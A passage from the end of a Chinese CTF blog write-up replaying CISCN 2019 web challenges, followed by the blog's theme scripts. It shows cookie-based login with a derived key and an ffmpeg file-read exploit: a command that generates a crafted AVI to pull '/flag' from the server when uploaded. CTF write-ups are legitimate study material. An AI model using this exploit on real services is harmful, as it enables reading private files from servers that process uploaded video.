user_info = get_user_info(user_key)
print(user_info)</code></pre>
<p>如果测试的返回没有问题的话，我们就可以直接拿payload修改为cookie登录了。实际上页面源码中会提示，预设一个值为Key的cookie,所以我们直接添加Key值cookie,成功登陆。<br>最后就是一个misc型题目了……后台唯一比较有意思 的是视频上传功能，而随便上传后再下下来我们的上传视频，会发现视频的MD5值发生改变。说明可能服务器对视频处理过了。这里赵师傅设计的是ffmpeg对视频处理。所以可找能处理ffmpeg漏洞的脚本<br><a href="https://github.com/neex/ffmpeg-avi-m3u-xbin/" target="_blank" rel="noopener">https://github.com/neex/ffmpeg-avi-m3u-xbin/</a></p>
<pre><code>python gen_xbin_avi.py file:///flag test.avi</code></pre><p>上传后再下下来，第一帧就有flag了。<br><img src="/2020/02/19/CISCN-2019-web%E9%83%A8%E5%88%86%E5%A4%8D%E7%8E%B0/11.PNG" class="lazyload" data-srcset="11.PNG" srcset="data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAABGdBTUEAALGPC/xhBQAAADhlWElmTU0AKgAAAAgAAYdpAAQAAAABAAAAGgAAAAAAAqACAAQAAAABAAAAAaADAAQAAAABAAAAAQAAAADa6r/EAAAAC0lEQVQIHWNgAAIAAAUAAY27m/MAAAAASUVORK5CYII=" alt="flag"></p>

  
  
    
    <div class='footer'>
      
      
      
        <div class='copyright'>
          <blockquote>
            
              
                <p>博客内容遵循 署名-非商业性使用-相同方式共享 4.0 国际 (CC BY-NC-SA 4.0) 协议</p>

              
            
              
                <p>本文永久链接是：<a href=https://www.bycsec.top/2020/02/19/CISCN-2019-web%E9%83%A8%E5%88%86%E5%A4%8D%E7%8E%B0/>https://www.bycsec.top/2020/02/19/CISCN-2019-web%E9%83%A8%E5%88%86%E5%A4%8D%E7%8E%B0/</a></p>
              
            
          </blockquote>
        </div>
      
      
        <div class='donate'>
          <div class='imgs'>
            
              <img src='/assests/wechat.png'>
            
          </div>
        </div>
      
    </div>
  
  
    


  <div class='article-meta' id="bottom">
    <div class='new-meta-box'>
      
        
          <div class="new-meta-item date" itemprop="dateUpdated" datetime="2021-02-18T13:08:53+08:00">
  <a class='notlink'>
    <i class="fas fa-edit fa-fw" aria-hidden="true"></i>
    <p>更新于：Feb 18, 2021</p>
  </a>
</div>

        
      
        
          
  
  <div class="new-meta-item meta-tags"><a class="tag" href="/tags/WEB/" rel="nofollow"><i class="fas fa-hashtag fa-fw" aria-hidden="true"></i><p>WEB</p></a></div> <div class="new-meta-item meta-tags"><a class="tag" href="/tags/CTF/" rel="nofollow"><i class="fas fa-hashtag fa-fw" aria-hidden="true"></i><p>CTF</p></a></div>


        
      
    </div>
  </div>


  
  

  
    <div class="prev-next">
      
        <a class='prev' href='/2020/02/25/NCTF-phar-matches-everything%E5%A1%AB%E5%9D%91/'>
          <p class='title'><i class="fas fa-chevron-left" aria-hidden="true"></i>NCTF-phar-matches-everything填坑</p>
          <p class='content'>之前校赛web最难的一道题……当时水平菜的看都不敢看，现在按师傅要求来做做这道题。(zjy师傅说这题把php相关知识几乎全考了，看来是很集大成的一道题目。)
题目首先进去后有两个功能，一个是仅限...</p>
        </a>
      
      
        <a class='next' href='/2020/02/18/%E4%BB%8E%E6%9D%AD%E7%94%B5hgame-week4%E5%AD%A6%E5%8E%9F%E5%9E%8B%E9%93%BE%E6%B1%A1%E6%9F%93/'>
          <p class='title'>从杭电hgame-week4学原型链污染<i class="fas fa-chevron-right" aria-hidden="true"></i></p>
          <p class='content'>因为数模导致本来不打算做week4的题目的，不过当时瞅了一眼sekiro这道题并且看出来是原型链污染(也有叫Node.js污染,javasrcipt原型链污染的)。可惜当时没做过，没深入也没做出...</p>
        </a>
      
    </div>
  
</article>


  

  <article class="post white-box reveal shadow" id="comments">
    <p ct><i class='fas fa-comments'></i> 评论</p>
    
    <div id="valine_container" class="valine_thread">
  <i class="fas fa-cog fa-spin fa-fw fa-2x"></i>
</div>

  </article>






</div>
<aside class='l_side'>
  
  
    
    



  <section class="widget toc-wrapper shadow desktop mobile" id="toc-div" >
    
  <header>
    
      <i class="fas fa-list fa-fw" aria-hidden="true"></i><span class='name'>本文目录</span>
    
  </header>


    <div class='content'>
        
    </div>
  </section>


  


</aside>



		  
		  <!--此文件用来存放一些不方便取值的变量-->
<!--思路大概是将值藏到重加载的区域内-->

<script>
  window.pdata={}
  pdata.ispage=true;
  pdata.postTitle="CISCN-2019-web部分复现";
  pdata.commentPath="";
  pdata.commentPlaceholder="";
  // header 这里无论是否开启pjax都需要
  var l_header=document.getElementById("l_header");
  
  l_header.classList.remove("show");
  
  
    // cover
    var cover_wrapper=document.querySelector('.cover-wrapper');
    
    cover_wrapper.id="half";
    cover_wrapper.style.display="";
    
  
</script>

        </div>
        
  
  <footer class="footer clearfix">
    <br><br>
    
      
        <div class="aplayer-container">
          


        </div>
      
    
      
        <br>
        <div class="social-wrapper">
          
            
              <a href="/atom.xml"
                class="social fas fa-rss flat-btn"
                target="_blank"
                rel="external nofollow noopener noreferrer">
                
              </a>
            
          
            
              <a href="mailto:baiyecha404@gmail.com"
                class="social fas fa-envelope flat-btn"
                target="_blank"
                rel="external nofollow noopener noreferrer">
                
              </a>
            
          
            
              <a href="https://github.com/baiyecha404"
                class="social fab fa-github flat-btn"
                target="_blank"
                rel="external nofollow noopener noreferrer">
                
              </a>
            
          
        </div>
      
    
      
        <div><p>博客内容遵循 <a href="https://creativecommons.org/licenses/by-nc-sa/4.0/deed.zh" target="_blank" rel="noopener">署名-非商业性使用-相同方式共享 4.0 国际 (CC BY-NC-SA 4.0) 协议</a></p>
</div>
      
    
      
        
          <div><p><span id="lc-sv">本站总访问量为 <span id='number'><i class="fas fa-circle-notch fa-spin fa-fw" aria-hidden="true"></i></span> 次</span> <span id="lc-uv">访客数为 <span id='number'><i class="fas fa-circle-notch fa-spin fa-fw" aria-hidden="true"></i></span> 人</span></p>
</div>
        
      
    
      
        本站使用
        <a href="https://github.com/volantis-x/hexo-theme-volantis/tree/" target="_blank" class="codename">Volantis</a>
        作为主题
      
    
      
        <div class='copyright'>
        <p><a href="bycsec.top">Copyright © 2020 byc_404</a></p>

        </div>
      
    
  </footer>


        <a id="s-top" class="fas fa-arrow-up fa-fw" href="javascript:void(0)"></a>
      </div>
    </div>
    <div>
      <script>
/************这个文件存放不需要重载的全局变量和全局函数*********/
window.volantis={};
window.volantis.loadcss=document.getElementById("loadcss");
/******************** Pjax ********************************/
function VPjax(){
	this.list=[] // 存放回调函数
	this.start=()=>{
	  for(var i=0;i<this.list.length;i++){
		this.list[i].run();
	  }
	}
	this.push=(fn,name)=>{
		var f=new PjaxItem(fn,name);
		this.list.push(f);
	}
	// 构造一个可以run的对象
	function PjaxItem(fn,name){
		// 函数名称
		this.name = name || fn.name
		// run方法
		this.run=()=>{
			fn()
		}
	}
}
volantis.pjax={}
volantis.pjax.method={
	complete: new VPjax(),
	error: new VPjax(),
	send: new VPjax()
}
volantis.pjax={
	...volantis.pjax,
	push: volantis.pjax.method.complete.push,
	error: volantis.pjax.method.error.push,
	send: volantis.pjax.method.send.push
}
/********************脚本懒加载函数********************************/
// 已经加入了setTimeout
function loadScript(src, cb) {
	setTimeout(function() {
		var HEAD = document.getElementsByTagName('head')[0] || document.documentElement;
		var script = document.createElement('script');
		script.setAttribute('type','text/javascript');
		if (cb) script.onload = cb;
		script.setAttribute('src', src);
		HEAD.appendChild(script);
	});
}
//https://github.com/filamentgroup/loadCSS
var loadCSS = function( href, before, media, attributes ){
	var doc = window.document;
	var ss = doc.createElement( "link" );
	var ref;
	if( before ){
		ref = before;
	}
	else {
		var refs = ( doc.body || doc.getElementsByTagName( "head" )[ 0 ] ).childNodes;
		ref = refs[ refs.length - 1];
	}
	var sheets = doc.styleSheets;
	if( attributes ){
		for( var attributeName in attributes ){
			if( attributes.hasOwnProperty( attributeName ) ){
				ss.setAttribute( attributeName, attributes[attributeName] );
			}
		}
	}
	ss.rel = "stylesheet";
	ss.href = href;
	ss.media = "only x";
	function ready( cb ){
		if( doc.body ){
			return cb();
		}
		setTimeout(function(){
			ready( cb );
		});
	}
	ready( function(){
		ref.parentNode.insertBefore( ss, ( before ? ref : ref.nextSibling ) );
	});
	var onloadcssdefined = function( cb ){
		var resolvedHref = ss.href;
		var i = sheets.length;
		while( i-- ){
			if( sheets[ i ].href === resolvedHref ){
				return cb();
			}
		}
		setTimeout(function() {
			onloadcssdefined( cb );
		});
	};
	function loadCB(){
		if( ss.addEventListener ){
			ss.removeEventListener( "load", loadCB );
		}
		ss.media = media || "all";
	}
	if( ss.addEventListener ){
		ss.addEventListener( "load", loadCB);
	}
	ss.onloadcssdefined = onloadcssdefined;
	onloadcssdefined( loadCB );
	return ss;
};
</script>
<script>
  
  loadCSS("https://cdn.jsdelivr.net/npm/@fortawesome/fontawesome-free@5.14/css/all.min.css", window.volantis.loadcss);
  
  
  
  
  loadCSS("https://cdn.jsdelivr.net/npm/highlight.js@11.5.0/styles/atom-one-dark.css", window.volantis.loadcss);
  
</script>
<!-- required -->

<script src="https://cdn.jsdelivr.net/npm/jquery@3.5/dist/jquery.min.js"></script>

<script>
  function pjax_fancybox() {
    $(".md .gallery").find("img").each(function () { //渲染 fancybox
      var element = document.createElement("a"); // a 标签
      $(element).attr("class", "fancybox");
      $(element).attr("pjax-fancybox", "");  // 过滤 pjax
      $(element).attr("href", $(this).attr("src"));
      if ($(this).attr("data-original")) {
        $(element).attr("href", $(this).attr("data-original"));
      }
      $(element).attr("data-fancybox", "images");
      var caption = "";   // 描述信息
      if ($(this).attr('alt')) {  // 判断当前页面是否存在描述信息
        $(element).attr('data-caption', $(this).attr('alt'));
        caption = $(this).attr('alt');
      }
      var div = document.createElement("div");
      $(div).addClass("fancybox");
      $(this).wrap(div); // 最外层套 div ，其实主要作用还是 class 样式
      var span = document.createElement("span");
      $(span).addClass("image-caption");
      $(span).text(caption); // 加描述
      $(this).after(span);  // 再套一层描述
      $(this).wrap(element);  // 最后套 a 标签
    })
    $(".md .gallery").find("img").fancybox({
      selector: '[data-fancybox="images"]',
      hash: false,
      loop: false,
      closeClick: true,
      helpers: {
        overlay: {closeClick: true}
      },
      buttons: [
        "zoom",
        "close"
      ]
    });
  };
  function SCload_fancybox() {
    if ($(".md .gallery").find("img").length == 0) return;
    loadCSS("https://cdn.jsdelivr.net/npm/@fancyapps/fancybox@3.5.7/dist/jquery.fancybox.min.css", document.getElementById("loadcss"));
    loadScript('https://cdn.jsdelivr.net/gh/fancyapps/fancybox@3.5.7/dist/jquery.fancybox.min.js', pjax_fancybox)
  };
  $(function () {
    SCload_fancybox();
  });
  function Pjax_SCload_fancybox(){
	if (typeof $.fancybox == "undefined") {
	 SCload_fancybox();
    } else {
	 pjax_fancybox();
    }
  }
  volantis.pjax.push(Pjax_SCload_fancybox)
  volantis.pjax.send(()=>{
      if (typeof $.fancybox != "undefined") {
        $.fancybox.close();    // 关闭弹窗
      }
  },'fancybox')
</script>


<!-- internal -->

  
  
  
    
<script src="https://cdn.jsdelivr.net/npm/jquery-backstretch@2.1.18/jquery.backstretch.min.js"></script>

    <script type="text/javascript">
        var imgs=["https://cdn.jsdelivr.net/gh/volantis-x/cdn-wallpaper-minimalist/2020/001.jpg", "https://cdn.jsdelivr.net/gh/volantis-x/cdn-wallpaper-minimalist/2020/002.jpg", "https://cdn.jsdelivr.net/gh/volantis-x/cdn-wallpaper-minimalist/2020/003.jpg", "https://cdn.jsdelivr.net/gh/volantis-x/cdn-wallpaper-minimalist/2020/004.jpg", "https://cdn.jsdelivr.net/gh/volantis-x/cdn-wallpaper-minimalist/2020/005.jpg", "https://cdn.jsdelivr.net/gh/volantis-x/cdn-wallpaper-minimalist/2020/006.jpg", "https://cdn.jsdelivr.net/gh/volantis-x/cdn-wallpaper-minimalist/2020/012.jpg", "https://cdn.jsdelivr.net/gh/volantis-x/cdn-wallpaper-minimalist/2020/016.jpg", "https://cdn.jsdelivr.net/gh/volantis-x/cdn-wallpaper-minimalist/2020/019.jpg", "https://cdn.jsdelivr.net/gh/volantis-x/cdn-wallpaper-minimalist/2020/025.jpg", "https://cdn.jsdelivr.net/gh/volantis-x/cdn-wallpaper-minimalist/2020/033.jpg", "https://cdn.jsdelivr.net/gh/volantis-x/cdn-wallpaper-minimalist/2020/034.jpg", "https://cdn.jsdelivr.net/gh/volantis-x/cdn-wallpaper-minimalist/2020/035.jpg", "https://cdn.jsdelivr.net/gh/volantis-x/cdn-wallpaper-minimalist/2020/038.jpg", "https://cdn.jsdelivr.net/gh/volantis-x/cdn-wallpaper-minimalist/2020/039.jpg", "https://cdn.jsdelivr.net/gh/volantis-x/cdn-wallpaper-minimalist/2020/042.jpg", "https://cdn.jsdelivr.net/gh/volantis-x/cdn-wallpaper-minimalist/2020/046.jpg", "https://cdn.jsdelivr.net/gh/volantis-x/cdn-wallpaper-minimalist/2020/051.jpg", "https://cdn.jsdelivr.net/gh/volantis-x/cdn-wallpaper-minimalist/2020/052.jpg", "https://cdn.jsdelivr.net/gh/volantis-x/cdn-wallpaper-minimalist/2020/054.jpg", "https://cdn.jsdelivr.net/gh/volantis-x/cdn-wallpaper-minimalist/2020/056.jpg"];
        if ('true' == 'true') {
          function shuffle(arr){
            /*From countercurrent-time*/
            var n = arr.length;
            while(n--) {
              var index = Math.floor(Math.random() * n);
              var temp = arr[index];
              arr[index] = arr[n];
              arr[n] = temp;
            }
          }
          shuffle(imgs);
        }
	  function Pjax_backstretch(){
        
          $.backstretch(
            imgs,
          {
            duration: "10000",
            fade: "1500"
          });
        
	  }
	  loadScript("https://cdn.jsdelivr.net/npm/jquery-backstretch@2.1.18/jquery.backstretch.min.js",Pjax_backstretch)
    </script>
  




<script>
  function loadIssuesJS() {
    if ($(".md").find(".issues-api").length == 0) return;
	
	  loadScript('/js/issues.js');
	
  };
  $(function () {
    loadIssuesJS();
  });
  volantis.pjax.push(()=>{
	if (typeof IssuesAPI == "undefined") {
	  loadIssuesJS();
	}
  },"IssuesJS")
</script>



  <script defer src="https://cdn.jsdelivr.net/npm/vanilla-lazyload@17.1.0/dist/lazyload.min.js"></script>
<script>
  // https://www.npmjs.com/package/vanilla-lazyload
  // Set the options globally
  // to make LazyLoad self-initialize
  window.lazyLoadOptions = {
    elements_selector: ".lazyload",
    threshold: 0
  };
  // Listen to the initialization event
  // and get the instance of LazyLoad
  window.addEventListener(
    "LazyLoad::Initialized",
    function (event) {
      window.lazyLoadInstance = event.detail.instance;
    },
    false
  );
  document.addEventListener('DOMContentLoaded', function () {
    lazyLoadInstance.update();
  });
  document.addEventListener('pjax:complete', function () {
    lazyLoadInstance.update();
  });
</script>




  

<script>
  window.FPConfig = {
	delay: 0,
	ignoreKeywords: [],
	maxRPS: 5,
	hoverDelay: 25
  };
</script>
<script defer src="https://cdn.jsdelivr.net/gh/gijo-varghese/flying-pages@2.1.2/flying-pages.min.js"></script>











  
  
<script src="/js/valine.js"></script>


<script>
  function emoji(path, idx, ext) {
    return path + "/" + path + "-" + idx + "." + ext;
  }
  var emojiMaps = {};
  for (var i = 1; i <= 54; i++) {
    emojiMaps['tieba-' + i] = emoji('tieba', i, 'png');
  }
  for (var i = 1; i <= 101; i++) {
    emojiMaps['qq-' + i] = emoji('qq', i, 'gif');
  }
  for (var i = 1; i <= 116; i++) {
    emojiMaps['aru-' + i] = emoji('aru', i, 'gif');
  }
  for (var i = 1; i <= 125; i++) {
    emojiMaps['twemoji-' + i] = emoji('twemoji', i, 'png');
  }
  for (var i = 1; i <= 4; i++) {
    emojiMaps['weibo-' + i] = emoji('weibo', i, 'png');
  }
  function pjax_valine() {
    if(!document.querySelectorAll("#valine_container")[0])return;
    let pagePlaceholder = pdata.commentPlaceholder || "快来评论吧~";
    let path = pdata.commentPath;
    if (path.length == 0) {
      let defaultPath = '';
      path = defaultPath || decodeURI(window.location.pathname);
    }
    var valine = new Valine();
    valine.init(Object.assign({"path":null,"placeholder":"快来评论吧~","appId":"pHdKUGJwAoGnVczqB6eSKVzO-gzGzoHsz","appKey":"9HlyBGu0qm9EmkSNKD2qoBx4","meta":["nick","mail","link"],"requiredFields":["nick","mail"],"enableQQ":true,"recordIP":true,"avatar":"robohash","pageSize":10,"lang":"zh-cn","highlight":true,"mathJax":false}, {
      el: '#valine_container',
      path: path,
      placeholder: pagePlaceholder,
      emojiCDN: 'https://cdn.jsdelivr.net/gh/volantis-x/cdn-emoji/valine/',
      emojiMaps: emojiMaps,
    }))
  }
  $(function () {
    pjax_valine();
  });
  volantis.pjax.push(pjax_valine);
</script>






  
<script src="/js/app.js"></script>



<!-- optional -->

  <script>
const SearchServiceimagePath="https://cdn.jsdelivr.net/gh/volantis-x/cdn-volantis@master/img/";
const ROOT =  ("/" || "/").endsWith('/') ? ("/" || "/") : ("//" || "/" );

$('.input.u-search-input').one('focus',function(){
	
		loadScript('https://cdn.jsdelivr.net/gh/xaoxuu/cdn-volantis@2.6.5/js/search.js',setSearchService);
	
})

function listenSearch(){
  
    customSearch = new HexoSearch({
      imagePath: SearchServiceimagePath
    });
  
}
function setSearchService() {
	listenSearch();
	
}
</script>









  

<script src="https://cdn.jsdelivr.net/gh/highlightjs/cdn-release@10/build/highlight.min.js"></script>

<script>hljs.highlightAll()</script>
<script src="https://cdn.jsdelivr.net/npm/highlightjs-line-numbers.js@2.8.0/dist/highlightjs-line-numbers.min.js"></script>
<script>hljs.initLineNumbersOnLoad({ singleLine: true });</script>

<script>
volantis.pjax.push(()=>{
	document.querySelectorAll('pre code').forEach((block) => {
	  hljs.highlightBlock(block);
	  hljs.lineNumbersBlock(block, {  singleLine: true });
	});
},"highlightjs")
</script>



  <script defer>

  const LCCounter = {
    app_id: 'pHdKUGJwAoGnVczqB6eSKVzO-gzGzoHsz',
    app_key: '9HlyBGu0qm9EmkSNKD2qoBx4',
    custom_api_server: '',

    // 查询存储的记录
    getRecord(Counter, url, title) {
      return new Promise(function (resolve, reject) {
        Counter('get', '/classes/Counter?where=' + encodeURIComponent(JSON.stringify({url})))
          .then(resp => resp.json())
          .then(({results, code, error}) => {
            if (code === 401) {
              throw error;
            }
            if (results && results.length > 0) {
              var record = results[0];
              resolve(record);
            } else {
              Counter('post', '/classes/Counter', {url, title: title, times: 0})
                .then(resp => resp.json())
                .then((record, error) => {
                  if (error) {
                    throw error;
                  }
                  resolve(record);
                }).catch(error => {
                console.error('Failed to create', error);
                reject(error);
              });
            }
          }).catch((error) => {
          console.error('LeanCloud Counter Error:', error);
          reject(error);
        });
      })
    },

    // 发起自增请求
    increment(Counter, incrArr) {
      return new Promise(function (resolve, reject) {
        Counter('post', '/batch', {
          "requests": incrArr
        }).then((res) => {
          res = res.json();
          if (res.error) {
            throw res.error;
          }
          resolve(res);
        }).catch((error) => {
          console.error('Failed to save visitor count', error);
          reject(error);
        });
      });
    },

    // 构建自增请求体
    buildIncrement(objectId) {
      return {
        "method": "PUT",
        "path": `/1.1/classes/Counter/${ objectId }`,
        "body": {
          "times": {
            '__op': 'Increment',
            'amount': 1
          }
        }
      }
    },

    // 校验是否为有效的 UV
    validUV() {
      var key = 'LeanCloudUVTimestamp';
      var flag = localStorage.getItem(key);
      if (flag) {
        // 距离标记小于 24 小时则不计为 UV
        if (new Date().getTime() - parseInt(flag) <= 86400000) {
          return false;
        }
      }
      localStorage.setItem(key, new Date().getTime().toString());
      return true;
    },

    addCount(Counter) {
      var enableIncr = '' === 'true' && window.location.hostname !== 'localhost';
      enableIncr = true;
      var getterArr = [];
      var incrArr = [];
      // 请求 PV 并自增
      var pvCtn = document.querySelector('#lc-sv');
      if (pvCtn || enableIncr) {
        var pvGetter = this.getRecord(Counter, 'https://www.bycsec.top' + '/#lc-sv', 'Visits').then((record) => {
          incrArr.push(this.buildIncrement(record.objectId))
          var eles = document.querySelectorAll('#lc-sv #number');
          if (eles.length > 0) {
            eles.forEach((el,index,array)=>{
              el.innerText = record.times + 1;
              if (pvCtn) {
                pvCtn.style.display = 'inline';
              }
            })
          }
        });
        getterArr.push(pvGetter);
      }

      // 请求 UV 并自增
      var uvCtn = document.querySelector('#lc-uv');
      if (uvCtn || enableIncr) {
        var uvGetter = this.getRecord(Counter, 'https://www.bycsec.top' + '/#lc-uv', 'Visitors').then((record) => {
          var vuv = this.validUV();
          vuv && incrArr.push(this.buildIncrement(record.objectId))
          var eles = document.querySelectorAll('#lc-uv #number');
          if (eles.length > 0) {
            eles.forEach((el,index,array)=>{
              el.innerText = record.times + (vuv ? 1 : 0);
              if (uvCtn) {
                uvCtn.style.display = 'inline';
              }
            })
          }
        });
        getterArr.push(uvGetter);
      }

      // 请求文章的浏览数，如果是当前页面就自增
      var allPV = document.querySelectorAll('#lc-pv');
      if (allPV.length > 0 || enableIncr) {
        for (i = 0; i < allPV.length; i++) {
          let pv = allPV[i];
          let title = pv.getAttribute('data-title');
          var url = 'https://www.bycsec.top' + pv.getAttribute('data-path');
          if (url) {
            var viewGetter = this.getRecord(Counter, url, title).then((record) => {
              // 是当前页面就自增
              let curPath = window.location.pathname;
              if (curPath.includes('index.html')) {
                curPath = curPath.substring(0, curPath.lastIndexOf('index.html'));
              }
              if (pv.getAttribute('data-path') == curPath) {
                incrArr.push(this.buildIncrement(record.objectId));
              }
              if (pv) {
                var ele = pv.querySelector('#lc-pv #number');
                if (ele) {
                  if (pv.getAttribute('data-path') == curPath) {
                    ele.innerText = (record.times || 0) + 1;
                  } else {
                    ele.innerText = record.times || 0;
                  }
                  pv.style.display = 'inline';
                }
              }
            });
            getterArr.push(viewGetter);
          }
        }
      }

      // 如果启动计数自增，批量发起自增请求
      if (enableIncr) {
        Promise.all(getterArr).then(() => {
          incrArr.length > 0 && this.increment(Counter, incrArr);
        })
      }

    },


    fetchData(api_server) {
      var Counter = (method, url, data) => {
        return fetch(`${ api_server }/1.1${ url }`, {
          method,
          headers: {
            'X-LC-Id': this.app_id,
            'X-LC-Key': this.app_key,
            'Content-Type': 'application/json',
          },
          body: JSON.stringify(data)
        });
      };
      this.addCount(Counter);
    },

    refreshCounter() {
      var api_server = this.app_id.slice(-9) !== '-MdYXbMMI' ? this.custom_api_server : `https://${ this.app_id.slice(0, 8).toLowerCase() }.api.lncldglobal.com`;
      if (api_server) {
        this.fetchData(api_server);
      } else {
        fetch('https://app-router.leancloud.cn/2/route?appId=' + this.app_id)
          .then(resp => resp.json())
          .then(({api_server}) => {
            this.fetchData('https://' + api_server);
          });
      }
    }

  };

  LCCounter.refreshCounter();

  document.addEventListener('pjax:complete', function () {
    LCCounter.refreshCounter();
  });
</script>




  <script>
const rootElement = document.documentElement;
const darkModeStorageKey = "user-color-scheme";
const rootElementDarkModeAttributeName = "data-user-color-scheme";

const setLS = (k, v) => {
    localStorage.setItem(k, v);
};

const removeLS = (k) => {
    localStorage.removeItem(k);
};

const getLS = (k) => {
    return localStorage.getItem(k);
};

const getModeFromCSSMediaQuery = () => {
  return window.matchMedia("(prefers-color-scheme: dark)").matches
    ? "dark"
    : "light";
};

const resetRootDarkModeAttributeAndLS = () => {
  rootElement.removeAttribute(rootElementDarkModeAttributeName);
  removeLS(darkModeStorageKey);
};

const validColorModeKeys = {
  dark: true,
  light: true,
};

const applyCustomDarkModeSettings = (mode) => {
  const currentSetting = mode || getLS(darkModeStorageKey);

  if (currentSetting === getModeFromCSSMediaQuery()) {
    resetRootDarkModeAttributeAndLS();
  } else if (validColorModeKeys[currentSetting]) {
    rootElement.setAttribute(rootElementDarkModeAttributeName, currentSetting);
  } else {
    resetRootDarkModeAttributeAndLS();
  }
};

const invertDarkModeObj = {
  dark: "light",
  light: "dark",
};

/**
 * get target mode
 */
const toggleCustomDarkMode = () => {
  let currentSetting = getLS(darkModeStorageKey);

  if (validColorModeKeys[currentSetting]) {
    currentSetting = invertDarkModeObj[currentSetting];
  } else if (currentSetting === null) {
    currentSetting = invertDarkModeObj[getModeFromCSSMediaQuery()];
  } else {
    return;
  }
  setLS(darkModeStorageKey, currentSetting);
  return currentSetting;
};

/**
 * bind click event for toggle button
 */
var btn=$("#wrapper .toggle-mode-btn,#rightmenu-wrapper .toggle-mode-btn");
function bindToggleButton() {
    btn.on('click',(e) => {
      const mode = toggleCustomDarkMode();
      applyCustomDarkModeSettings(mode);
    });
}

applyCustomDarkModeSettings();
document.addEventListener("DOMContentLoaded", bindToggleButton);
volantis.pjax.push(bindToggleButton);
volantis.pjax.send(()=>{
	btn.unbind('click');
},'toggle-mode-btn-unbind');
</script>








<script>
function listennSidebarTOC() {
  const navItems = document.querySelectorAll(".toc li");
  if (!navItems.length) return;
  const sections = [...navItems].map((element) => {
    const link = element.querySelector(".toc-link");
    const target = document.getElementById(
      decodeURI(link.getAttribute("href")).replace("#", "")
    );
    link.addEventListener("click", (event) => {
      event.preventDefault();
      window.scrollTo({
		top: target.offsetTop + 100,
		
		behavior: "smooth"
		
	  });
    });
    return target;
  });

  function activateNavByIndex(target) {
    if (target.classList.contains("active-current")) return;

    document.querySelectorAll(".toc .active").forEach((element) => {
      element.classList.remove("active", "active-current");
    });
    target.classList.add("active", "active-current");
    let parent = target.parentNode;
    while (!parent.matches(".toc")) {
      if (parent.matches("li")) parent.classList.add("active");
      parent = parent.parentNode;
    }
  }

  function findIndex(entries) {
    let index = 0;
    let entry = entries[index];
    if (entry.boundingClientRect.top > 0) {
      index = sections.indexOf(entry.target);
      return index === 0 ? 0 : index - 1;
    }
    for (; index < entries.length; index++) {
      if (entries[index].boundingClientRect.top <= 0) {
        entry = entries[index];
      } else {
        return sections.indexOf(entry.target);
      }
    }
    return sections.indexOf(entry.target);
  }

  function createIntersectionObserver(marginTop) {
    marginTop = Math.floor(marginTop + 10000);
    let intersectionObserver = new IntersectionObserver(
      (entries, observe) => {
        let scrollHeight = document.documentElement.scrollHeight + 100;
        if (scrollHeight > marginTop) {
          observe.disconnect();
          createIntersectionObserver(scrollHeight);
          return;
        }
        let index = findIndex(entries);
        activateNavByIndex(navItems[index]);
      },
      {
        rootMargin: marginTop + "px 0px -100% 0px",
        threshold: 0,
      }
    );
    sections.forEach((element) => {
      element && intersectionObserver.observe(element);
    });
  }
  createIntersectionObserver(document.documentElement.scrollHeight);
}

document.addEventListener("DOMContentLoaded", listennSidebarTOC);
document.addEventListener("pjax:success", listennSidebarTOC);
</script>

<!-- more -->

 
	   
	    


<script src="https://cdn.jsdelivr.net/npm/pjax@0.2.8/pjax.min.js"></script>


<script>
    var pjax;
    document.addEventListener('DOMContentLoaded', function () {
      pjax = new Pjax({
        elements: 'a[href]:not([href^="#"]):not([href="javascript:void(0)"]):not([pjax-fancybox])',
        selectors: [
          "title",
          
          "#pjax-container",
          "#pjax-header-nav-list"
        ],
        cacheBust: false,   // url 地址追加时间戳，用以避免浏览器缓存
        timeout: 5000
      });
    });

    document.addEventListener('pjax:send', function (e) {
      //window.stop(); // 相当于点击了浏览器的停止按钮

      try {
        var currentUrl = window.location.pathname;
        var targetUrl = e.triggerElement.href;
        var banUrl = [""];
        if (banUrl[0] != "") {
          banUrl.forEach(item => {
            if(currentUrl.indexOf(item) != -1 || targetUrl.indexOf(item) != -1) {
              window.location.href = targetUrl;
            }
          });
        }
      } catch (error) {}

      window.subData = null; // 移除标题（用于一二级导航栏切换处）

      volantis.$switcher.removeClass('active'); // 关闭移动端激活的搜索框
      volantis.$header.removeClass('z_search-open'); // 关闭移动端激活的搜索框
      volantis.$wrapper.removeClass('sub'); // 跳转页面时关闭二级导航

      // 解绑事件 避免重复监听
      volantis.$topBtn.unbind('click');
      $('.menu a').unbind('click');
      $(window).unbind('resize');
      $(window).unbind('scroll');
      $(document).unbind('scroll');
      $(document).unbind('click');
      $('body').unbind('click');
	  // 使用 volantis.pjax.send 方法传入pjax:send回调函数 参见layout/_partial/scripts/global.ejs
	  volantis.pjax.method.send.start();
    });

    document.addEventListener('pjax:complete', function () {
      $('.nav-main').find('.list-v').not('.menu-phone').removeAttr("style",""); // 移除小尾巴的移除
      $('.menu-phone.list-v').removeAttr("style",""); // 移除小尾巴的移除
      $('script[data-pjax], .pjax-reload script').each(function () {
        $(this).parent().append($(this).remove());
      });
      try{
		// 使用 volantis.pjax.push 方法传入重载函数 参见layout/_partial/scripts/global.ejs
		volantis.pjax.method.complete.start();
      } catch (e) {
        console.log(e);
      }
    });

    document.addEventListener('pjax:error', function (e) {
	  // 使用 volantis.pjax.error 方法传入pjax:error回调函数 参见layout/_partial/scripts/global.ejs
	  volantis.pjax.method.error.start();
      window.location.href = e.triggerElement.href;
    });
</script>
 
	  
    </div>
  </body>
</html>
